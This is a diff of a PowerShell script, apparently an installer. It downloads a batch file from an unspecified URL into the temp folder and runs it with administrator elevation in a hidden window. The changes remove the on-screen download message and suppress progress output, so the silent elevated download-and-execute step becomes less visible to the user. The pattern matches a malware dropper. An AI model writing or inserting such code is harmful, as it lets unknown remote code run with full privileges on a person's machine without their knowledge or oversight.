@@ -7,22 +7,22 @@ $tempDir = $env:TEMP
 $batFile = "$tempDir\lazy-install.bat"
 
 try {
-    # Enforce modern security protocols
+    # Force TLS 1.2 and disable progress
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-    
+    $ProgressPreference = 'SilentlyContinue'
+
     # Download batch file
-    Write-Host "Downloading security toolkit..." -ForegroundColor Cyan
     Invoke-WebRequest -Uri $batUrl -UseBasicParsing -OutFile $batFile -ErrorAction Stop
 
-    # Verify download
-    if (-not (Test-Path $batFile)) {
-        throw "Download verification failed"
+    # Verify and execute
+    if (Test-Path $batFile) {
+        Start-Process cmd.exe -ArgumentList "/c `"$batFile & exit`"" -Verb RunAs -WindowStyle Hidden
     }
-
-    # Automatic execution with elevation
-    Start-Process cmd.exe -ArgumentList "/c `"$batFile & exit`"" -Verb RunAs -WindowStyle Hidden
-
-} catch {
-    Write-Host "`n[ERROR] $($_.Exception.Message)" -ForegroundColor Red
+    else {
+        throw "Download failed"
+    }
+}
+catch {
+    Write-Host "Installation Error: $($_.Exception.Message)" -ForegroundColor Red
     exit 1
 }
